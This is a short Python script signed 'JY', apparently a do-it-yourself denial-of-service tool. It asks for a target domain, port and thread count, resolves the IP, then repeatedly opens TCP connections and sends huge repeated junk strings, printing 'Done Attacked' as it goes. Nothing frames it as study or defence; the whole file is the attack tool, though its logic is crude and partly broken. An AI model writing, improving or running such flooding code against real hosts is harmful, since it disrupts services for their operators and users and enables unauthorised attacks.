import socket
import time,threading

url = input ("\033[1;32m Enter Domain WebSite : ")
print ("\033[1;31m="*60)
th = int(input("\033[1;32m Enter Number Of Threads : "))
print ("\033[1;31m="*60)
port =  int (input ("\033[1;32m Enter Domain port : "))
print ("\033[1;31m="*60)
url = socket.gethostbyname(url)

print (f"\033[1;32m Done Get IP adress *By [JY] {url}")
print ("\033[1;31m="*60)

print ("\033[1;32m Waiting For Attack....")
print ("\033[1;31m="*60)

time.sleep(3)



#size = 5000
#openfile = open('JY2.mp4','rb')


from socket import socket , AF_INET , SOCK_STREAM

def doss(url):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((url,port))
    a = 0
    b = 10
    c = 15
    d = 120
    
    while a < d:
        
        a = a + 1 * c * b * d
        
        array = ["uggufchuttyubcyyyddDXnvhuygguhcggdrygYFFUHFGYGG@#$$$_&&&(()))////?!!!!;;::::::**$_-+(&#$-{=€^{¶¶π•`~¢¥=✓©©✓]]©©^°YFGYYFFHUgchiibbCGTDFTF@@$_JHVU&$#@**##"]
        
        array = array * a
        n = 0
        n2 = 0
        #while openfile:
#            n2 = n2+1
#            s.send(openfile.read(size))
#            print ('\033[1;32m ....' +str(size)+ f' Bit Is Sent *By JY {[n2]}....')
#        openfile.close()
        for JY in array:
            
            n = n+1
            
            JY = str(JY).encode("utf-8")
            
            
            s.send(JY)
    
            print (f"\033[1;32m...Done Attacked... [*By JY] ...{[n]}...")
        
        

for x in range(th):
    try:
        doss(url)
        doss(url)
        doss(url)
        doss(url)
        doss(url)
        doss(url)
    except:
        continue
    
